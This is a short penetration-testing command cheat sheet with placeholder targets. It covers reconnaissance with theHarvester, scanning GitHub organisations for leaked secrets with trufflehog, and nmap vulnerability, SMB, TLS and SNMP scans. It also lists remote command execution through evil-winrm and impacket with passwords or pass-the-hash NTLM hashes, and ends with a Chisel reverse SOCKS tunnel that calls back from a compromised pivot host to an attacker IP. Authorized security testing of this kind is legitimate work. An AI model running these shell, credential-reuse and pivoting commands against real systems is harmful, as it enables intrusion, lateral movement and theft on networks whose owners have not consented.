commands.cmd:
mkdir -p ~/pentests/{CLIENT}/{recon,scans,exploitation,post-exploit,evidence,loot,report}
cd ~/pentests/{CLIENT}

# Enable terminal logging:
script -a -t 2>terminal_timing.log terminal_session.log
# Stop: exit  |  Replay: scriptreplay terminal_timing.log terminal_session.log

# theHarvester:
theHarvester -d {DOMAIN} -b google,bing,linkedin,yahoo,duckduckgo,crtsh,hackertarget -l 500 -f ~/pentests/{CLIENT}/recon/harvester.html

# GitHub secret scanning:
pip3 install trufflehog --break-system-packages
trufflehog github --org={ORG} --token={GITHUB_PAT}
trufflehog git https://github.com/{ORG}/{REPO}

# General vulnerability scan:
nmap -sV --script='vuln,safe,auth' -p {PORTS} -oA nmap_vuln {TARGET}

# SMB vulnerability checks:
nmap --script='smb-vuln*' -p 139,445 {TARGET}

# SSL/TLS audit:
nmap --script='ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-dh-params' -p 443,8443 {TARGET}

# SNMP:
nmap -sU --script=snmp-info --script-args snmpcommunity=public -p 161 {TARGET}

# Evil-WinRM (WinRM port 5985/5986):
evil-winrm -i {TARGET_IP} -u {USER} -p '{PASS}'
evil-winrm -i {TARGET_IP} -u {USER} -H {NTLM_HASH}

# Impacket (quietest to noisiest):
impacket-wmiexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}
impacket-smbexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}
impacket-psexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}
impacket-wmiexec {DOMAIN}/{USER}@{TARGET_IP} -hashes :{NTLM_HASH}

# Chisel SOCKS pivot:
./chisel server -p 9001 --reverse                          # attacker
./chisel.exe client {YOUR_IP}:9001 R:socks                 # on pivot host
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf
proxychains nmap -sT -p 445,22,3389 {INTERNAL_IP}
